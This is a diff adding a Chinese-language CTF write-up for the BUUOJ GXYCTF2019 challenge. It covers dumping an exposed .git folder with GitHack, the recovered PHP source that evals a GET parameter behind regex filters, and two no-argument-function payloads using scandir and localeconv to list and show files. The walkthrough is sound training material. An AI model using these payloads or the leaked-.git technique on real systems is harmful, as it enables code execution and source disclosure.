@@ -3046,6 +3046,126 @@ if(!isset($_GET['host'])) {
 
 最后使用蚁剑连接即可！
 
+## BUUOJ [GXYCTF2019]禁止套娃
+
+### 1. 复现
+
+进来没有什么头绪，看HTTP报文也没有什么东西。此时只能做一个目录爆破
+
+<img src="CTF.assets/image-20231120231000621.png" alt="image-20231120231000621" style="zoom: 67%;" />
+
+![image-20231120231112409](CTF.assets/image-20231120231112409.png)
+
+发现有一个`.git`文件夹，直接用`githacker`导出来，发现源码！
+
+```bash
+┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
+└─# python GitHack.py http://3309502c-0f7b-42e5-bfbb-3136abbc9efe.node4.buuoj.cn:81/.git/
+[+] Download and parse index file ...
+[+] index.php
+[OK] index.php
+```
+
+整个源码主要要注意的位置是第二条正则过滤，只要绕过这条其他的都好说！
+
+```php
+<?php
+$_GET['exp'] = 'session_start();';
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                 echo $_GET['exp'];
+//                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+
+```
+
+第二条正则是CTF无参数RCE考点的主要写法，还有一种写法是：`/[^\W]+\((?R)?\)/`
+
+```
+/[a-z,_]+\((?R)?\)/
+
+[a-z,_]+：匹配多个小写字母
+\(：匹配 (
+\)：匹配 )
+?R：递归匹配。能匹配 a(b(c()))
+总结：匹配所有不带参数的函数
+```
+
+翻翻葵花宝典，原来学过！再初略复习了一下之后写出了第一条payload：
+
+```
+payload1：show_source(array_rand(array_flip(scandir(current(localeconv())))));		# 随机
+payload2：show_source(next(array_reverse(scandir(current(localeconv())))));
+```
+
+这里稍微解释一下：
+
+```php
+<?php
+var_dump(localeconv());
+
+# 输出：
+array(18) {
+  'decimal_point' =>
+  string(1) "."						# 主要是这里，能拿到一个“.”，基于这个点就可以扫描当前目录
+  'thousands_sep' =>
+  string(0) ""
+  'int_curr_symbol' =>
+  string(0) ""
+  'currency_symbol' =>
+  string(0) ""
+  'mon_decimal_point' =>
+  string(0) ""
+  'mon_thousands_sep' =>
+  string(0) ""
+  'positive_sign' =>
+  string(0) ""
+  'negative_sign' =>
+  string(0) ""
+  'int_frac_digits' =>
+  int(127)
+  'frac_digits' =>
+  int(127)
+  'p_cs_precedes' =>
+  int(127)
+  'p_sep_by_space' =>
+  int(127)
+  'n_cs_precedes' =>
+  int(127)
+  'n_sep_by_space' =>
+  int(127)
+  'p_sign_posn' =>
+  int(127)
+  'n_sign_posn' =>
+  int(127)
+  'grouping' =>
+  array(0) {
+  }
+  'mon_grouping' =>
+  array(0) {
+  }
+}
+```
+
+![img](CTF.assets/2541080-20211014131709032-1238913099.png)
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
